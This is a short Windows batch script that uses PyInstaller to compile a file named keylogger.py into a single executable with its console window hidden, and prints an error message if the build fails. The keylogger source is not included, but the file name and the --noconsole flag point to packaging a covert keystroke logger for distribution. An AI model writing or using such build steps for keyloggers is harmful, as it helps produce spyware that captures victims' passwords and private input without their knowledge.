@echo off

pyinstaller.exe --noconsole --onefile keylogger.py
SET SUC = TRUE
IF %ERRORLEVEL% NEQ 0 (
echo FAILED TO PRODUCE EXE FILE.&echo
pause
)